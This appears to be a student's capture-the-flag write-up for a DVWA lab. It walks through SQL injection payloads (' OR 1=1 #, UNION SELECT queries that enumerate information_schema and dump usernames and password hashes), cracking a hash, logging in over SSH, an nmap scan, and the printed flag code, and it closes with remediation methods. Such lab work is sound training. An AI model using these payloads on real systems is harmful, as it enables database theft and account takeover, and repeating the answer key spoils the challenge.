
# Challenge 1: SQL Injection

In this part, you must discover user account information on a server and crack the password of Bob Smith's account. You will then locate the file with Challenge 1 code and use Bob Smith's account credentials to open the file at 192.168.0.10 to view its contents.

# Step 1:Preliminary setup

a. **Open a web browser and navigate to the target website.**

- URL: [http://10.5.5.12](http://10.5.5.12/) (kindly load a the ethical kail environment).
- This loads the DVWA login page.

<img width="960" height="504" alt="Screenshot 2026-01-11 153342" src="https://github.com/user-attachments/assets/fa08c9b8-9a4c-410e-a1a1-1c40659e176f" />

### b. Login with the credentials admin/password.

**Log in with the provided default credentials.**

- Username: admin
- Password: password
- Click "Login."
- This grants access to the DVWA dashboard.

  <img width="960" height="504" alt="Screenshot 2026-01-11 153423" src="https://github.com/user-attachments/assets/44ec0513-db1e-41e1-b7f1-c2c83220237f" />

### C. Set the DVWA security level to low and click Submit.

- Navigate to the "DVWA Security" section in the left menu.
- Select "Low" from the dropdown.
- Click "Submit.
- At low security, DVWA does not sanitize inputs, enabling SQL injection exploits.
  
"![image](https://github.com/user-attachments/assets/e58d04f2-64b3-4ccb-a354-77e2fadaad29)

  ## Step 2: Retrieve the user credentials for Bob Smith’s account.

**Locate the vulnerable input form.**

- In the DVWA dashboard, click "SQL Injection" in the left menu.
- This displays a simple form: "User ID:" with a text box and "Submit" button.
- The backend likely constructs a query like: SELECT first_name, last_name FROM users WHERE user_id = '$input';

 ![image (1)](https://github.com/user-attachments/assets/7c2ea096-8ddd-4399-b0b2-201e23b18b95)

![image (2)](https://github.com/user-attachments/assets/ada11465-c20c-4ffe-9b9f-5952bcb6880f)

<img width="960" height="504" alt="Screenshot 2026-01-11 155014" src="https://github.com/user-attachments/assets/01b02e2d-42ad-4e03-a07d-9439b472b2ec" />


**Check DVWA to see if a SQL Injection Vulnerability is present.**

**Test for SQL injection vulnerability.**

- Enter the payload: ' OR 1=1 #
- Click "Submit."

  <img width="490" height="150" alt="Screenshot 2026-01-11 153708" src="https://github.com/user-attachments/assets/51245fca-03d8-475d-8684-c6d05a60c1fb" />

<img width="460" height="419" alt="Screenshot 2026-01-11 154212" src="https://github.com/user-attachments/assets/4b2a410c-10d0-48bd-a6a8-3f5482612e39" />


**Determine the database name.**

- Enter the payload: 1' OR 1=1 UNION SELECT 1, DATABASE()#
- Click "Submit."

- Expected output: Displays user info plus the database name in the second column (e.g., "dvwa").
![image (3)](https://github.com/user-attachments/assets/da37e5a0-30e1-40ba-90cd-1392299606ae)


### a. Identify the table that contains usernames and passwords

**Identify the table containing usernames and passwords.**

- Enter the payload: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'
- Click "Submit."

  ![image (4)](https://github.com/user-attachments/assets/6152a3c0-cac0-42e7-ba55-e55f1d6bb69a)

  ![image (5)](https://github.com/user-attachments/assets/dc60cd01-1526-4c35-af72-5314708a4baf)


### b. Locate a vulnerable input form that will allow you to inject SQL commands.

**Retrieve column names from the 'users' table.**

- Enter the payload: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'
- Click "Submit."
  
  ![image (6)](https://github.com/user-attachments/assets/30497457-cb23-4b1a-81a1-048986b2870f)
  ![image (7)](https://github.com/user-attachments/assets/eb83eb43-fe9f-41e5-9c56-4336626d0875)

### c. Retrieve the username and the password hash for Bob Smith's account.

**Retrieve the user credentials including Bob Smith.**

- Enter the payload: 1' OR 1=1 UNION SELECT user, password FROM users #
- Click "Submit."
![image (8)](https://github.com/user-attachments/assets/b387f7df-45d3-4e35-bbe9-264dc823ee3a)
![image (9)](https://github.com/user-attachments/assets/31bb98ee-af42-4985-a6af-e802a5098e2f)


  ### Step 3: Crack Bob Smith’s account password.

Use any password hash cracking tool desired to crack Bob Smith’s password.
Question

### What is the password of Bob Smith’s account?

<img width="960" height="504" alt="Screenshot 2026-01-11 160714" src="https://github.com/user-attachments/assets/5708cb56-f3fd-4165-95b1-216c89bd122b" />

<img width="960" height="504" alt="Screenshot 2026-01-11 160930" src="https://github.com/user-attachments/assets/714f8606-1161-4717-b5c3-35a7e1f065da" />

![image (10)](https://github.com/user-attachments/assets/ad4f992e-004c-48b8-aa55-6d3a98f82cb5)

## Step 4: Locate and open the file with Challenge 1 code.

### a. Log into 192.168.0.10 as Bob Smith.

**Log into the target server.**

- Use SSH or a terminal to connect to 192.168.0.10.
- Username: smithy (Bob Smith's username from the dump).
- Password: password (cracked value).

  **ssh smithy@192.168.0.10**

**Scan for open ports if needed.**

- Use nmap: nmap 192.168.0.10
- Shows open ports like 22 (SSH)
![image (11)](https://github.com/user-attachments/assets/0d6f5752-b86d-421c-881c-314c4b0ce82d)
 ![image (12)](https://github.com/user-attachments/assets/17ca54b6-0def-44ad-bf07-149d0ad81eb3)

 ![image (13)](https://github.com/user-attachments/assets/3d96f4e9-d844-413a-aaf6-7d34436c97b2)

 ![image (14)](https://github.com/user-attachments/assets/b544f99f-c30a-4ba5-9680-c404de65e7b7)

### What is the name of the file with the code?

**Navigate and open the challenge file.**

- Once logged in, list files: ls
- Locate 'my_passwords.txt' or similar.
- View contents: cat my_passwords.txt
- Expected output: "Congratulations! You found the flag for Challenge 1! The code for this challenge is 874wfb2."

![image (15)](https://github.com/user-attachments/assets/22482e97-2147-4104-b837-7c1ec442e7cf)

![image (16)](https://github.com/user-attachments/assets/4da80c76-e870-4371-901f-764860bfabda)


## Step 5: Research and propose SQL attack remediation

What are five remediation methods for preventing SQL injection exploits

Here are five key remediation methods for preventing SQL injection exploits:

- prepared statements

- implementing the principle of least privilege

- employing input validation

- utilizing stored procedures

- managing error messages securely
